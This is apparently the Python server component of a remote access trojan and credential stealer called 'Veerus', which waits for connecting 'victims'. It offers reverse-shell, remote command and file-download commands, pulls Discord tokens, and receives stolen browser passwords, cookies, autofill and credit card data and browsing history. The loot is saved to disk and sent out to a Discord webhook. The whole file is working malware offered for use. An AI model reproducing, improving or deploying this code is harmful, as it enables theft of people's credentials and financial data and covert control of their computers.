PORT = 7777
HOST = "127.0.0.1"
WEBHOOK = "" #Leave blank if you don't wanna use this.

"""

	please contact us if you publish this folder.
	0xSz WiLl H4Ck YoUr WebSiTe iF You DonT PromOtE Me LmAo


"""


import simpleaudio as sa
import codecs
from discord_webhook import DiscordWebhook
from datetime import datetime
import uuid
import socket
import random
import string
import os
import time
import threading
from pydub import AudioSegment
from pydub.playback import play



def ClearTerm():
	if(os.name == "nt" or os.name == "windows"):
		os.system("cls")
	else:
		os.system("clear")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ClearTerm()
print("Made with <3 by 0xSxZ on github .")
time.sleep(1)
ClearTerm()
print("Made with <3 by 0xSxZ on github ..")
time.sleep(0.3)
ClearTerm()
print("Made with <3 by 0xSxZ on github ...")
time.sleep(0.3)
ClearTerm()
print("Made with <3 by 0xSxZ on github .")
time.sleep(0.3)
ClearTerm()
print("Made with <3 by 0xSxZ on github ..")
time.sleep(0.3)
ClearTerm()
print("Made with <3 by 0xSxZ on github ...")
time.sleep(0.6)
ClearTerm()
print("Ready? go !")
time.sleep(1)


ClearTerm()

def FileInput(linee):
	conn.send(bytes(linee, encoding='utf-8'))
	print("0xSz : commands : ls, cd, or (ex: ./file.txt)\n\n0xSz >> choose file or change directory using 'cd'\n\b"+str(conn.recv(1024)))
	while 1:
		command_dwn = input("github@0xSz >> ")
		conn.send(bytes(command_dwn, encoding='utf-8'))
		if 'ls' or 'cd' in command_dwn:
			conn.send(bytes(command_dwn, encoding='utf-8'))
			conn.recv(1024)
		else:
			f = open("recv/"+ command_dwn, 'w+')
			print("[.] Recieving...")
			writing = conn.recv(4096)
			f.write(str(writing))
def netcatThread():
	print("Note : To quit reverse shell type 'exit'")
	input("Press enter...")
	ClearTerm()
	while 1:
		commandReverse = input("github@0xSz>> ")
		if commandReverse == "exit":
			clearyesorno = input("0xSz : Clear teminal? (y/n) >> ")
			if clearyesorno == "y":
				ClearTerm()
			else:
				detectInput()
			break
		else:
			conn.send(bytes(commandReverse, encoding='utf-8'))
			print("[.] Result >> " + str(conn.recv(1024)))

def remoteDesktop():
	print("Note : To quit code input type 'exit'")
	input("Press enter...")
	ClearTerm()
	while 1:
		commandReverse = input("github@0xSz>> ")
		if commandReverse == "exit":
			clearyesorno = input("0xSz : Clear teminal? (y/n) >> ")
			if clearyesorno == "y":
				ClearTerm()
			else:
				detectInput()
			break
		else:
			conn.send(commandReverse.encode())
			print("[.] Result >> " + str(conn.recv(1024).decode()))

def detectInput():
	ratinp = input("[.] Press Enter for rat : ")
	Flemme = "1"
	if Flemme  == "1":
		time.sleep(0.5)
		ClearTerm()
		print("V")
		time.sleep(0.5)
		ClearTerm()
		print("Ve")
		time.sleep(0.5)
		ClearTerm()
		print("Vee")
		time.sleep(0.5)
		ClearTerm()
		print("Veer")
		time.sleep(0.5)
		ClearTerm()
		print("Veeru")
		time.sleep(0.5)
		ClearTerm()
		print("Veerus")
		time.sleep(2)
		ClearTerm()
		print("""Commands :
		
		SOON : 

		excfile : execute a file,
		=>usage example : excfile 1.1.1.1 /victim/path/file.exe
		
		
		shwips : Show all ips connected,
		=>usage example : shwips

		sndallfile : download an exe for all computer in the appdata.
		=>usage example : dwnallfile server/path/file.exe true 
		=>info : (put true if you want to execute the file, false if not.)


		AVAILABLE : 
		
		rvshl : Install a reverse shell in the desired ip.
		=>usage example : rvshl 1.1.1.1

		
		dwnfile : download a file in the desired ip, 
		=>usage example : dwnfile 1.1.1.1 ./server/path/file.exe file.exe
		=> info : 1st path is the server file path, 2nd is the recieving
		

		tkn : get discord token for all machines...
		=> usage example : tkn
		
		revcmd : execute a command in the desisred ip
		=> usage example : rvcmd 1.1.1.1 iexplorer heheheha.com

		clearterm : Clear the server terminal, can be useful.
		=>usage example : clearterm
		""")

		while 1:
			choice = input("\n\n command : ")
			if choice == "clearterm":
				ClearTerm()
			elif choice == "exitrat":
				ClearTerm()
				print("[.] 0xSz : Still listening for victims man.")
				threading.Thread(target=detectInput).start()
				break
			elif "rvshl" in choice:
				print("[.] Starting reverse shell...")
				conn.recv(1024)
				conn.send(bytes(choice, encoding='utf-8') )
				threading.Thread(target=netcatThread).start()
				break
			elif "dwnfile" in choice:
				threading.Thread(target=FileInput(choice))
				break
			elif "revcmd" in choice:
				conn.send(bytes(choice, encoding='utf-8'))
				print(conn.recv(1024))
			elif choice == "tkn":
				conn.send(b'tkn')
				dat = conn.recv(1024)
				print(dat)
				if(WEBHOOK != "" and WEBHOOK != None):
					webhook = DiscordWebhook(url=WEBHOOK, username="github.com/0xSxZ/Veerus/")
					webhook.add_file(file=dat.decode(), filename="0xSxZ_on_Github.txt") 
					webhook.execute()
			else:
				conn.send(b'Command not recognize')
print("[.] 0xSz : Veerus is listening for new victims\n")

s.bind((HOST, PORT))
s.listen()
threading.Thread(target=detectInput).start() 
def recvall(sock):
    BUFF_SIZE = 4096 # 4 KiB
    data = b''
    while True:
        part = sock.recv(BUFF_SIZE)
        data += part
        if len(part) < BUFF_SIZE:
            # either 0 or end of data
            break
    return data

while 1:
	conn, addr = s.accept()
	print("\n\n[.] New Victim connected.")
	data = conn.recv(1024)
	print("\n\n"+str(data.decode())) 
	try:
		filename = 'sound/alert.wav'
		wave_obj = sa.WaveObject.from_wave_file(filename)
		play_obj = wave_obj.play()
		play_obj.wait_done()
	except:
		print("0xSz >> Could'nt find audio device, no heheheha :(")

	dataPassw1 = str(conn.recv(1024))
	dataPassw = codecs.decode(dataPassw1.encode()).replace("{", "\n").replace("}", '\n').replace("'", " ").replace(",", '')

	dataDiscord1 = str(conn.recv(1024)).replace("'b'", "\n")
	dataDiscord = codecs.decode(dataDiscord1.encode()).replace("b'", "\n").replace('b"', '').replace("'", "").replace("'", '').replace('"', '')

	dataCookies = recvall(conn)

	dataAutofill = conn.recv(1024)

	dataHistory = recvall(conn)


	#print(dataPassw + "\n\n\n\n" + dataDiscord +"\n\n\n\n" + str(dataCookies) + "\n\n\n\n" + str(dataAutofill))
	dataPassw = str(dataPassw)
	if(WEBHOOK != "" and WEBHOOK != None):
		webhook = DiscordWebhook(url=WEBHOOK, username="github.com/0xSxZ/Veerus/")
		webhook.add_file(file=dataCookies.decode(), filename="0xCookies.txt") 
		webhook.add_file(file=dataDiscord, filename="0xSxZ_On_Github_T0kains.txt")
		webhook.add_file(file=dataPassw, filename="0xPasswords.txt")
		webhook.add_file(file=dataAutofill.decode(), filename="Autofill_And_Cr7ditC4rds.txt")
		webhook.add_file(file=dataHistory.decode(), filename="Lmao_PornHub_History_XDDD.txt")
		webhook.execute()

	dateNow = str(datetime.now().strftime("%Y-%m-%d-%H-%M-%S"))
	if os.name == "nt" or os.name == "windows":
		stealerPth = "stealer\\" +dateNow
		os.system("mkdir stealer\\" + dateNow)
		pth1 = "discord browser"
		os.system("mkdir " + stealerPth)
		os.chdir(stealerPth)
		os.system("mkdir " + pth1)
		os.chdir("..")
		os.chdir("..")
	time.sleep(3)
	open(stealerPth + "\\browser\\passwords.txt", "x").write(dataPassw)
	open(stealerPth +"\\browser\\autofills.txt", "x").write(dataAutofill.decode())
	open(stealerPth +"\\browser\\cookies.txt", "x").write(dataCookies.decode())
	open(stealerPth +"\\browser\\history.txt", "x").write(dataHistory.decode())
	open(stealerPth +"\\discord\\tokens.txt", "x").write(dataDiscord)
